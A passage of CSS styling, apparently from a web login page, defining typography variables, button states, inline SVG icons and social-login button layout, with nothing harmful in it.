            --uxText--fontSize0: var(--ux-1a61xr7, var(--ux-vvspv2, 1rem));
            --uxText--fontSize-1: calc(var(--uxText--fontSize0) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize-2: calc(var(--uxText--fontSize-1) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize1: calc(var(--uxText--fontSize0) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize2: calc(var(--uxText--fontSize1) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize3: calc(var(--uxText--fontSize2) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize4: calc(var(--uxText--fontSize3) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize5: calc(var(--uxText--fontSize4) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--lineHeight: calc(var(--ux-14t1fes, var(--ux-1w31hux, 1.5)) var(--ux-1u3f284, *) var(--ux-51yj5o, 1));
            font-size: var(--uxText--fontSize0);
            line-height: var(--uxText--lineHeight);
            font-family: var(--ux-9pe28g, var(--ux-1067ph9, sans-serif));
            font-weight: var(--ux-v02jxi, var(--ux-sm2he3, 400));
            font-variation-settings: var(--ux-1dpg6l3, var(--ux-6mut96, inherit));
        }

        .ux-text.ux-text-title {
            --uxText--fontSize0: var(--ux-jg1026, var(--ux-18ime9a, 1.5rem));
            --uxText--lineHeight: var(--ux-10e88h5, var(--ux-1pw8hzd, 1.25));
            font-family: var(--ux-1q87e65, var(--ux-p4wcd9, sans-serif));
            font-weight: var(--ux-1b8kf4b, var(--ux-1a9e4a3, 700));
            font-variation-settings: var(--ux-192otyy, var(--ux-3x9eca, inherit));
        }

        .ux-text.ux-text-heading {
            --uxText--fontSize0: var(--ux-jm4jeu, var(--ux-9ic57q, 2rem));
            --uxText--lineHeight: var(--ux-1rdqzoh, var(--ux-p25s1t, 1.25));
            font-family: var(--ux-1md8q7p, var(--ux-shg991, serif));
            font-weight: var(--ux-tjjc5f, var(--ux-c539b7, 700));
            font-variation-settings: var(--ux-1yo4eb6, var(--ux-1458mfm, inherit));
        }

        .ux-text.ux-text-paragraph {
            --uxText--fontSize0: var(--ux-1i8fva8, var(--ux-1klxlj4, 1rem));
            --uxText--lineHeight: var(--ux-yu0s3r, var(--ux-mgbt9j, 1.5));
            font-family: var(--ux-1f6raab, var(--ux-117cu43, sans-serif));
            font-weight: var(--ux-27ku79, var(--ux-8n6y9x, 400));
            font-variation-settings: var(--ux-deyw5w, var(--ux-1i4pt2s, inherit));
        }

        .ux-text.ux-text-action {
            --uxText--fontSize0: var(--ux-74s1bk, var(--ux-cxbe8g, 1rem));
            --uxText--lineHeight: var(--ux-1dry2pj, var(--ux-jw5s9j, 1.5));
            font-family: var(--ux-1ir8vtv, var(--ux-gfnupv, sans-serif));
            font-weight: var(--ux-4g1r2t, var(--ux-j40yyd, 400));
            font-variation-settings: var(--ux-1xspc04, var(--ux-ndnsbo, inherit));
        }

        .ux-text.ux-text-input {
            --uxText--fontSize0: var(--ux-zkzmxk, var(--ux-oc0naw, 1rem));
            --uxText--lineHeight: var(--ux-neouyn, var(--ux-hm1ty7, 1.5));
            font-family: var(--ux-o591yj, var(--ux-9wtaa3, sans-serif));
            font-weight: var(--ux-1095x0d, var(--ux-3z6ccd, 400));
            font-variation-settings: var(--ux-j138x8, var(--ux-e727t8, inherit));
        }

        .ux-text.ux-text-label {
            --uxText--fontSize: var(--ux-1g5b33c, var(--ux-16aixzc, 1rem));
            --uxText--lineHeight: var(--ux-d7itcf, var(--ux-h93mi7, 1.5));
            font-family: var(--ux-134wucb, var(--ux-15ks663, sans-serif));
            font-weight: var(--ux-jigg19, var(--ux-aarlu5, 400));
            font-variation-settings: var(--ux-abra1o, var(--ux-1qg0ofw, inherit));
        }

        .ux-text.ux-text-caption {
            --uxText--fontSize0: var(--ux-1n2ego0, var(--ux-p4h24g, .875rem));
            --uxText--lineHeight: var(--ux-1xkykcn, var(--ux-1dje42v, 1.5));
            font-family: var(--ux-3gzsib, var(--ux-1gutwvn, sans-serif));
            font-weight: var(--ux-1dkcied, var(--ux-g9ierp, 400));
            font-variation-settings: var(--ux-1iow7o, var(--ux-tjt16c, inherit));
        }

        .ux-text.ux-text-size0 {
            font-size: var(--uxText--fontSize0);
        }

        .ux-text.ux-text-size1 {
            font-size: var(--uxText--fontSize1);
        }

        .ux-text.ux-text-size2 {
            font-size: var(--uxText--fontSize2);
        }

        .ux-text.ux-text-size3 {
            font-size: var(--uxText--fontSize3);
        }

        .ux-text.ux-text-size4 {
            font-size: var(--uxText--fontSize4);
        }

        .ux-text.ux-text-size5 {
            font-size: var(--uxText--fontSize5);
        }

        .ux-text.ux-text-size-1 {
            font-size: var(--uxText--fontSize-1);
        }

        .ux-text.ux-text-size-2 {
            font-size: var(--uxText--fontSize-2);
        }

        .ux-text.ux-text-feedback-critical {
            color: var(--ux-1k8kcmw, var(--ux-1fhc073, red));
        }

        .ux-text.ux-text-feedback-success {
            color: var(--ux-1cdj78w, var(--ux-1ep3kxj, green));
        }

        .ux-text.ux-text-feedback-warning {
            color: var(--ux-1atr6wp, var(--ux-lv1r6m, darkorange));
        }

        .ux-text.ux-text-feedback-info {
            color: var(--ux-1orzojh, var(--ux-1lpd00q, blue));
        }

        .ux-text.ux-text-feedback-highlight {
            color: var(--ux-1dmc3b7, var(--ux-cuskv8, blue));
        }

        .ux-text.ux-text-feedback-neutral {
            color: var(--ux-2xcava, var(--ux-e1mf41, blue));
        }

        .ux-text.ux-text-feedback-internal {
            color: var(--ux-114ywl0, var(--ux-1iwdp0z, blue));
        }

        .ux-text.ux-text-feedback-passive {
            color: var(--ux-t9hajc, var(--ux-1m9ys0v, gray));
        }

        .ux-text.ux-text-feedback-premium {
            color: var(--ux-1u7nbuw, var(--ux-143smq7, purple));
        }
    </style>
    <style>
        * {
            --uxp-icon-chevron-down: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path d=%27M18.53 8.47c-.139-.14-.333-.22-.53-.22s-.391.08-.53.22L12 13.94 6.53 8.47a.75.75 0 00-1.06 1.06l6 6c.139.14.333.22.53.22s.391-.08.53-.22l6-6a.753.753 0 00.22-.53.757.757 0 00-.22-.53z%27/></svg>");
        }

        .uxicon-chevron-down:before {
            content: var(--uxp-icon-chevron-down)
        }
    </style>
    <style>
        * {
            --uxp-icon-link-arrow: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path d=%27M21.53 11.477l-5-5a.757.757 0 00-.53-.221c-.198 0-.393.08-.532.22s-.22.334-.22.53c0 .198.082.393.222.532l3.702 3.702H3a.75.75 0 100 1.5h16.207l-3.737 3.737a.757.757 0 00-.222.531c0 .197.08.392.22.532s.334.22.531.22a.756.756 0 00.531-.222l5-5c.14-.14.22-.333.22-.53s-.08-.391-.22-.53z%27/></svg>");
        }

        .uxicon-link-arrow:before {
            content: var(--uxp-icon-link-arrow)
        }

        /*rtl:raw:svg use[*|href$="link-arrow"]{transform: scaleX(-1) translateX(-100%)}*/
    </style>
    <style>
        * {
            --uxp-icon-window-new: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><g><path d=%27M21.567 2.524a.782.782 0 00-.109-.103h-.001a.78.78 0 00-.463-.155H14a.75.75 0 100 1.5h5.19l-7.533 7.532a.757.757 0 00-.221.53c0 .198.08.393.22.532s.333.22.53.22a.757.757 0 00.532-.222l7.532-7.532v5.19a.75.75 0 101.5 0v-7.01a.752.752 0 00-.183-.482z%27/><path d=%27M21 13.265a.75.75 0 00-.75.75v4.75a1.502 1.502 0 01-1.5 1.5H5.25a1.502 1.502 0 01-1.5-1.5v-13.5a1.502 1.502 0 011.5-1.5H10a.75.75 0 100-1.5H5.25a3.003 3.003 0 00-3 3v13.5a3.003 3.003 0 003 3h13.5a3.004 3.004 0 003-3v-4.75a.75.75 0 00-.75-.75z%27/></g></svg>");
        }

        .uxicon-window-new:before {
            content: var(--uxp-icon-window-new)
        }
    </style>
    <style>
        .ux-button {
            --ux-button-icon-margin: calc((var(--ux-t379ov, var(--ux-jw5s9j, 1.5)) * 1em - 1.5em) / 2);
            font-weight: inherit;
            color: var(--ux-1jw0794, var(--ux-ut3xrx, black));
            gap: 0.5em;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-text-decoration: var(--ux-1f7if5p, underline);
            text-decoration: var(--ux-1f7if5p, underline);
            background: transparent;
            margin: 0;
            border: 0;
            padding: 0;
            cursor: pointer;
        }

        .ux-button--stretch {
            width: 100%;
        }

        .ux-button:not([href])>* {
            pointer-events: none;
        }

        .ux-button:focus,
        .ux-button.focus {
            outline: var(--uxp-focus-visible-outline, none);
        }

        .ux-button:not([disabled]):hover,
        .ux-button:not([disabled]):active {
            color: var(--ux-1kyybpb, var(--ux-unx9i2, white));
        }

        .ux-button:not([disabled]):hover,
        .ux-button:not([disabled]):active {
            background-color: transparent;
        }

        .ux-button[href] {
            color: var(--ux-iysvx4, var(--ux-2rqapw, black));
        }

        .ux-button[href]:not([disabled]):hover,
        .ux-button[href]:not([disabled]):active {
            color: var(--ux-13nnjtr, var(--ux-1j87vvn, white));
        }

        .ux-button[disabled],
        .ux-button[disabled]:hover {
            opacity: var(--uxButtonDisabled--opacity, .4);
        }

        .ux-button[disabled],
        .ux-button[disabled]:hover {
            cursor: not-allowed;
        }

        .ux-button[aria-hidden="true"] {
            visibility: hidden;
        }

        .ux-button .ux-button-icon,
        .ux-button .ux-button-accessory {
            vertical-align: middle;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            overflow: visible;
            font-size: 1em;
            margin-block: var(--ux-button-icon-margin);
        }

        .ux-button:not(.ux-button-inline) {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            min-width: -webkit-min-content;
            min-width: -moz-min-content;
            min-width: min-content;
            white-space: nowrap;
            -webkit-text-decoration: none;
            text-decoration: none;
            transition: .15s ease-in-out;
            vertical-align: middle;
            border: var(--ux-1h06tzo, var(--ux-1q7rsup, 2px)) solid var(--ux-1847qpb, var(--ux-1np4r62, transparent));
            background-color: var(--ux-1ab3cod, var(--ux-1owc8nc, transparent));
            border-radius: var(--ux-f6o8ui, var(--ux-1s5tndb, 2px));
            padding: calc(var(--ux-1sbfig8, .25rem) * 2) calc(var(--ux-1sbfig8, .25rem) * 4);
            -webkit-transition: .15s ease-in-out;
        }

        .ux-button:not(.ux-button-inline).ux-button-square {
            padding: calc(var(--ux-1sbfig8, .25rem) * 2);
        }

        .ux-button:not(.ux-button-inline).ux-text-size-1 {
            padding: calc(var(--ux-1sbfig8, .25rem) * 1) calc(var(--ux-1sbfig8, .25rem) * 3);
        }

        .ux-button:not(.ux-button-inline).ux-text-size-1.ux-button-square {
            padding: calc(var(--ux-1sbfig8, .25rem) * 1);
        }

        .ux-button:not(.ux-button-inline):not([disabled]):hover {
            color: var(--ux-1kyybpb, var(--ux-unx9i2, white));
            background-color: var(--ux-cup4ju, var(--ux-1m7qrkf, blue));
            border-color: var(--ux-8xrj7s, var(--ux-1bdtclp, transparent));
        }

        .ux-button:not(.ux-button-inline):not([disabled]):active,
        .ux-button:not(.ux-button-inline):not([disabled])[aria-checked="true"],
        .ux-button:not(.ux-button-inline):not([disabled])[aria-expanded="true"],
        .ux-button:not(.ux-button-inline):not([disabled])[aria-selected="true"] {
            color: var(--ux-uq49pg, var(--ux-h6e7c1, white));
        }

        .ux-button:not(.ux-button-inline):not([disabled]):active,
        .ux-button:not(.ux-button-inline):not([disabled])[aria-checked="true"],
        .ux-button:not(.ux-button-inline):not([disabled])[aria-expanded="true"],
        .ux-button:not(.ux-button-inline):not([disabled])[aria-selected="true"] {
            background-color: var(--ux-o7ju0h, var(--ux-9qpf6c, blue));
            border-color: var(--ux-4hvovn, var(--ux-1xliuhi, transparent));
        }

        .ux-button.ux-button-stateless {
            color: inherit;
            background-color: transparent;
            border-color: transparent;
        }

        .ux-button.ux-button-stateless:not([disabled]):hover {
            color: inherit;
            background-color: transparent;
            border-color: transparent;
        }

        .ux-button.ux-button-stateless:not([disabled]):active,
        .ux-button.ux-button-stateless:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-stateless:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-stateless:not([disabled])[aria-selected="true"] {
            color: inherit;
        }

        .ux-button.ux-button-stateless:not([disabled]):active,
        .ux-button.ux-button-stateless:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-stateless:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-stateless:not([disabled])[aria-selected="true"] {
            background-color: transparent;
            border-color: transparent;
        }

        @supports (-webkit-backdrop-filter:contrast(.8)) or (backdrop-filter: contrast(.8)) {
            .ux-button.ux-button-stateless:not([disabled]):hover {
                -webkit-backdrop-filter: contrast(.8);
                backdrop-filter: contrast(.8);
            }
        }

        .ux-button.ux-button-primary {
            color: var(--ux-1tmjflg, var(--ux-t04p4h, white));
            background-color: var(--ux-pmb6pt, var(--ux-c5mlr8, green));
            border-color: var(--ux-pv1fr7, var(--ux-kdwujq, transparent));
        }

        .ux-button.ux-button-primary:not([disabled]):hover {
            color: var(--ux-ztff7, var(--ux-1ckzto6, white));
            background-color: var(--ux-57c70m, var(--ux-ran6wz, green));
            border-color: var(--ux-yuzgck, var(--ux-bgke81, transparent));
        }

        .ux-button.ux-button-primary:not([disabled]):active,
        .ux-button.ux-button-primary:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-primary:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-primary:not([disabled])[aria-selected="true"] {
            color: var(--ux-fzgwq0, var(--ux-1uyxcq5, white));
        }

        .ux-button.ux-button-primary:not([disabled]):active,
        .ux-button.ux-button-primary:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-primary:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-primary:not([disabled])[aria-selected="true"] {
            background-color: var(--ux-1rbbkil, var(--ux-1ehwjjs, green));
            border-color: var(--ux-1isvz6n, var(--ux-1hnbfne, transparent));
        }

        .ux-button.ux-button-secondary {
            color: var(--ux-9i6wci, var(--ux-w7826f, black));
            background-color: var(--ux-1cxvv3r, var(--ux-1r87102, transparent));
            border-color: var(--ux-13jzer9, var(--ux-1p5s1n4, transparent));
        }

        .ux-button.ux-button-secondary:not([disabled]):hover {
            color: var(--ux-5ealk5, var(--ux-1e7hthc, white));
            background-color: var(--ux-1vtym9c, var(--ux-c624hh, blue));
            border-color: var(--ux-r6rk8i, var(--ux-kkdx4n, transparent));
        }

        .ux-button.ux-button-secondary:not([disabled]):active,
        .ux-button.ux-button-secondary:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-secondary:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-secondary:not([disabled])[aria-selected="true"] {
            color: var(--ux-5k9tge, var(--ux-19ykcyj, white));
        }

        .ux-button.ux-button-secondary:not([disabled]):active,
        .ux-button.ux-button-secondary:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-secondary:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-secondary:not([disabled])[aria-selected="true"] {
            background-color: var(--ux-1g1zbaj, var(--ux-ix2s5q, blue));
            border-color: var(--ux-1beoca1, var(--ux-1ixzvrg, transparent));
        }

        .ux-button.ux-button-critical {
            color: var(--ux-k7jbzn, var(--ux-17htz86, white));
            background-color: var(--ux-16qi3qe, var(--ux-1marogz, red));
            border-color: var(--ux-1opx3z8, var(--ux-ceou01, transparent));
        }

        .ux-button.ux-button-critical:not([disabled]):hover {
            color: var(--ux-1bt73n8, var(--ux-9cq6k1, white));
            background-color: var(--ux-1cnpm0x, var(--ux-1q4q36s, red));
            border-color: var(--ux-1uu6y6b, var(--ux-n0tova, transparent));
        }

        .ux-button.ux-button-critical:not([disabled]):active,
        .ux-button.ux-button-critical:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-critical:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-critical:not([disabled])[aria-selected="true"] {
            color: var(--ux-71s1kf, var(--ux-17znn9m, white));
        }

        .ux-button.ux-button-critical:not([disabled]):active,
        .ux-button.ux-button-critical:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-critical:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-critical:not([disabled])[aria-selected="true"] {
            background-color: var(--ux-1h2pmii, var(--ux-926l8f, red));
            border-color: var(--ux-1o8e2ig, var(--ux-w3lhdp, transparent));
        }

        .ux-button.ux-button-control {
            color: var(--ux-a00lb3, var(--ux-1utwv7e, black));
            border-radius: 0;
            background-color: var(--ux-4yoeju, var(--ux-1mh0ktr, lightgray));
            border-color: var(--ux-1viaciw, var(--ux-1qbn65p, transparent));
        }

        .ux-button.ux-button-control:not([disabled]):hover {
            color: var(--ux-1t310s8, var(--ux-1e4ese5, white));
            background-color: var(--ux-g6t48d, var(--ux-11rtwg8, lightgray));
            border-color: var(--ux-8xjjjj, var(--ux-bg7olm, transparent));
        }

        .ux-button.ux-button-control:not([disabled]):active,
        .ux-button.ux-button-control:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-control:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-control:not([disabled])[aria-selected="true"] {
            color: var(--ux-pux60z, var(--ux-k4fkva, white));
        }

        .ux-button.ux-button-control:not([disabled]):active,
        .ux-button.ux-button-control:not([disabled])[aria-checked="true"],
        .ux-button.ux-button-control:not([disabled])[aria-expanded="true"],
        .ux-button.ux-button-control:not([disabled])[aria-selected="true"] {
            background-color: var(--ux-z40vau, var(--ux-gdy377, lightgray));
            border-color: var(--ux-1ps5g38, var(--ux-187j9dd, transparent));
        }
    </style>
    <style>
        .ux-sibling-set {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-align-items: flex-start;
            -webkit-box-align: flex-start;
            -ms-flex-align: flex-start;
            align-items: flex-start;
        }

        .ux-sibling-set.ux-sibling-set--stretch {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: stretch;
            -webkit-box-align: stretch;
            -ms-flex-align: stretch;
            align-items: stretch;
        }

        .ux-sibling-set.ux-sibling-set--stretch .ux-sibling-set-children>* {
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start;
        }

        .ux-sibling-set.ux-sibling-set--wrap {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
        }

        .ux-sibling-set>hr {
            width: 100%;
            margin: 0;
            border: 0;
            border-top: 1px solid;
        }

        .ux-sibling-set .ux-sibling-set-label {
            margin-block-end: calc(var(--ux-1sbfig8, .25rem) * 2);
        }

        .ux-sibling-set .ux-sibling-set-children {
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            display: inherit;
            -webkit-align-items: inherit;
            -webkit-box-align: inherit;
            -ms-flex-align: inherit;
            align-items: inherit;
            -webkit-box-pack: inherit;
            -webkit-justify-content: inherit;
            -ms-flex-pack: inherit;
            justify-content: inherit;
            -webkit-flex-wrap: inherit;
            -ms-flex-wrap: inherit;
            flex-wrap: inherit;
            gap: var(--ux-siblingset-gap, 0);
        }

        .ux-sibling-set.ux-sibling-set-gap-sm {
            --ux-siblingset-gap: calc(var(--ux-1sbfig8, .25rem) * 2);
        }

        .ux-sibling-set.ux-sibling-set-gap-md {
            --ux-siblingset-gap: calc(var(--ux-1sbfig8, .25rem) * 4);
        }

        .ux-sibling-set.ux-sibling-set-gap-lg {
            --ux-siblingset-gap: calc(var(--ux-1sbfig8, .25rem) * 6);
        }

        .ux-sibling-set.ux-sibling-set-horizontal .ux-sibling-set-children {
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
        }

        .ux-sibling-set.ux-sibling-set-vertical .ux-sibling-set-children {
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .ux-sibling-set .ux-text-caption {
            margin: calc(var(--ux-1sbfig8, .25rem) * 1) 0 0;
        }
    </style>
    <style>
        /******************* All buttons *******************/
        .alternative-login-button {
            min-height: 40px;
        }

        #social-login-buttons-container .ux-button-set {
            flex-direction: unset;
            text-align: center;
        }

        #social-login-buttons-container .sibling-set-position {
            justify-content: center;
        }

        #social-login-buttons-container .sibling-set-position .ux-button {
            justify-content: center;
        }

        #social-login-buttons-container .ux-button-set-margin {
            width: 100%;
            justify-content: space-between;
        }

        #social-login-buttons-container.two-only .ux-button-set-margin .ux-button {
            max-width: calc(50% - 8px);
            padding-left: 5px;
            padding-right: 5px;
        }

        [dir=rtl] #social-login-buttons-container.two-only .ux-button-set-margin .ux-button {
            padding-right: 5px;
            padding-left: 5px;
        }

        #social-login-buttons-container.icon-only .ux-button-set-margin {
            width: 100%;
            justify-content: center;
        }

        #social-login-buttons-container.icon-only .ux-button-set-margin .ux-button:not(:last-child) {
            margin-right: 16px;
        }

        [dir=rtl] #social-login-buttons-container.icon-only .ux-button-set-margin .ux-button:not(:last-child) {
            margin-left: 16px;
        }

        @media (max-width: 325px) {
            #social-login-buttons-container .ux-button-set-item {
                padding-left: 5px;
                padding-right: 5px;
            }
            
            [dir=rtl] #social-login-buttons-container .ux-button-set-item {
                padding-right: 5px;
                padding-left: 5px;
            }
        }

        /******************* Social Buttons *******************/

        #social-logo {
            display: block;
            position: relative;
            height: 20px;
            margin-right: 8px;
        }

        [dir=rtl] #social-logo {
            margin-left: 8px;
        }

        #social-logo.fb-logo {
            height: 22px;
        }

        #social-login-buttons-container #social-logo.wechat-logo {
            height: 21px;
            fill: #000;
        }

        #social-login-buttons-container #wechat_auth:focus #social-logo.wechat-logo,
        #social-login-buttons-container #wechat_auth:hover #social-logo.wechat-logo {
            fill: #0A757A;
        }

        .alternative-login-button-icon-only {
            min-width: 48px !important;
            max-width: 48px !important;
            padding-left: 2px !important;
            padding-right: 2px !important;
        }

        [dir=rtl] .alternative-login-button-icon-only {
            padding-right: 2px !important;
            padding-left: 2px !important;
        }

        .alternative-login-button-icon-only #social-logo {
            width: 48px;
            margin: auto !important;
        }

        .alternative-login-button #social-logo {
            width: 15px;
            margin-right: 5px;
        }

        [dir=rtl] .alternative-login-button #social-logo {
            margin-left: 5px;
        }

        .alternative-login-button #social-logo.fb-logo {
            width: 20px;
        }

        a.alternative-login-button-icon-only {
            margin-left: 12px !important;
            margin-right: 12px !important;
        }

        [dir=rtl] a.alternative-login-button-icon-only {
            margin-right: 12px !important;
            margin-left: 12px !important;
        }

        @media (max-width: 520px) and (min-width: 381px) {
            #social-login-buttons-container .alternative-login-button:not(:last-of-type) {
                margin-right: 8px;
            }

            [dir=rtl] #social-login-buttons-container .alternative-login-button:not(:last-of-type) {
                margin-left: 8px;
            }
        }

        /******************* End of Social buttons *******************/


        /******************* 'Or' labeled divider for buttons *******************/
        #labeled-divider {
            overflow: hidden;
            font-size: 18px !important;
            text-align: center;
            padding: 10px !important;
        }

        #labeled-divider>span {
            position: relative;
            display:
                inline-block;
        }

        #labeled-divider>span:before,
        #labeled-divider>span:after {
            position: absolute;
            top: 51%;
            width: 44%;
            height: 1px;
            content: '\a0';
            background-color: #E2E2E2;
        }

        #labeled-divider>span:before {
            right: 53%;
            margin-right: 15px;
        }

        [dir=rtl] #labeled-divider>span:before {
            left: 53%;
            margin-left: 15px;
        }

        #labeled-divider>span:after {
            left: 53%;
            margin-left: 15px;
        }

        [dir=rtl] #labeled-divider>span:after {
            right: 53%;
            margin-right: 15px;
        }

        /***************** End of 'Or' labeled divider for buttons *****************/
    </style>
    <style>
        .ux-text {
            --uxText--fontSize0: var(--ux-1a61xr7, var(--ux-vvspv2, 1rem));
            --uxText--fontSize-1: calc(var(--uxText--fontSize0) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize-2: calc(var(--uxText--fontSize-1) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize1: calc(var(--uxText--fontSize0) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize2: calc(var(--uxText--fontSize1) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize3: calc(var(--uxText--fontSize2) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize4: calc(var(--uxText--fontSize3) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize5: calc(var(--uxText--fontSize4) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--lineHeight: calc(var(--ux-14t1fes, var(--ux-1w31hux, 1.5)) var(--ux-1u3f284, *) var(--ux-51yj5o, 1));
            font-size: var(--uxText--fontSize0);
            line-height: var(--uxText--lineHeight);
            font-family: var(--ux-9pe28g, var(--ux-1067ph9, sans-serif));
            font-weight: var(--ux-v02jxi, var(--ux-sm2he3, 400));
            font-variation-settings: var(--ux-1dpg6l3, var(--ux-6mut96, inherit));
        }

        .ux-text.ux-text-title {
            --uxText--fontSize0: var(--ux-jg1026, var(--ux-18ime9a, 1.5rem));
            --uxText--lineHeight: var(--ux-10e88h5, var(--ux-1pw8hzd, 1.25));
            font-family: var(--ux-1q87e65, var(--ux-p4wcd9, sans-serif));
            font-weight: var(--ux-1b8kf4b, var(--ux-1a9e4a3, 700));
            font-variation-settings: var(--ux-192otyy, var(--ux-3x9eca, inherit));
        }

        .ux-text.ux-text-heading {
            --uxText--fontSize0: var(--ux-jm4jeu, var(--ux-9ic57q, 2rem));
            --uxText--lineHeight: var(--ux-1rdqzoh, var(--ux-p25s1t, 1.25));
            font-family: var(--ux-1md8q7p, var(--ux-shg991, serif));
            font-weight: var(--ux-tjjc5f, var(--ux-c539b7, 700));
            font-variation-settings: var(--ux-1yo4eb6, var(--ux-1458mfm, inherit));
        }

        .ux-text.ux-text-paragraph {
            --uxText--fontSize0: var(--ux-1i8fva8, var(--ux-1klxlj4, 1rem));
            --uxText--lineHeight: var(--ux-yu0s3r, var(--ux-mgbt9j, 1.5));
            font-family: var(--ux-1f6raab, var(--ux-117cu43, sans-serif));
            font-weight: var(--ux-27ku79, var(--ux-8n6y9x, 400));
            font-variation-settings: var(--ux-deyw5w, var(--ux-1i4pt2s, inherit));
        }

        .ux-text.ux-text-action {
            --uxText--fontSize0: var(--ux-74s1bk, var(--ux-cxbe8g, 1rem));
            --uxText--lineHeight: var(--ux-1dry2pj, var(--ux-jw5s9j, 1.5));
            font-family: var(--ux-1ir8vtv, var(--ux-gfnupv, sans-serif));
            font-weight: var(--ux-4g1r2t, var(--ux-j40yyd, 400));
            font-variation-settings: var(--ux-1xspc04, var(--ux-ndnsbo, inherit));
        }

        .ux-text.ux-text-input {
            --uxText--fontSize0: var(--ux-zkzmxk, var(--ux-oc0naw, 1rem));
            --uxText--lineHeight: var(--ux-neouyn, var(--ux-hm1ty7, 1.5));
            font-family: var(--ux-o591yj, var(--ux-9wtaa3, sans-serif));
            font-weight: var(--ux-1095x0d, var(--ux-3z6ccd, 400));
            font-variation-settings: var(--ux-j138x8, var(--ux-e727t8, inherit));
        }

        .ux-text.ux-text-label {
            --uxText--fontSize: var(--ux-1g5b33c, var(--ux-16aixzc, 1rem));
            --uxText--lineHeight: var(--ux-d7itcf, var(--ux-h93mi7, 1.5));
            font-family: var(--ux-134wucb, var(--ux-15ks663, sans-serif));
            font-weight: var(--ux-jigg19, var(--ux-aarlu5, 400));
            font-variation-settings: var(--ux-abra1o, var(--ux-1qg0ofw, inherit));
        }

        .ux-text.ux-text-caption {
            --uxText--fontSize0: var(--ux-1n2ego0, var(--ux-p4h24g, .875rem));
            --uxText--lineHeight: var(--ux-1xkykcn, var(--ux-1dje42v, 1.5));
            font-family: var(--ux-3gzsib, var(--ux-1gutwvn, sans-serif));
            font-weight: var(--ux-1dkcied, var(--ux-g9ierp, 400));
            font-variation-settings: var(--ux-1iow7o, var(--ux-tjt16c, inherit));
        }

        .ux-text.ux-text-size0 {
            font-size: var(--uxText--fontSize0);
        }

        .ux-text.ux-text-size1 {
            font-size: var(--uxText--fontSize1);
        }

        .ux-text.ux-text-size2 {
            font-size: var(--uxText--fontSize2);
        }

        .ux-text.ux-text-size3 {
            font-size: var(--uxText--fontSize3);
        }

        .ux-text.ux-text-size4 {
            font-size: var(--uxText--fontSize4);
        }

        .ux-text.ux-text-size5 {
            font-size: var(--uxText--fontSize5);
        }

        .ux-text.ux-text-size-1 {
            font-size: var(--uxText--fontSize-1);
        }

        .ux-text.ux-text-size-2 {
            font-size: var(--uxText--fontSize-2);
        }

        .ux-text.ux-text-feedback-critical {
            color: var(--ux-1k8kcmw, var(--ux-1fhc073, red));
        }

        .ux-text.ux-text-feedback-success {
            color: var(--ux-1cdj78w, var(--ux-1ep3kxj, green));
        }

        .ux-text.ux-text-feedback-warning {
            color: var(--ux-1atr6wp, var(--ux-lv1r6m, darkorange));
        }

        .ux-text.ux-text-feedback-info {
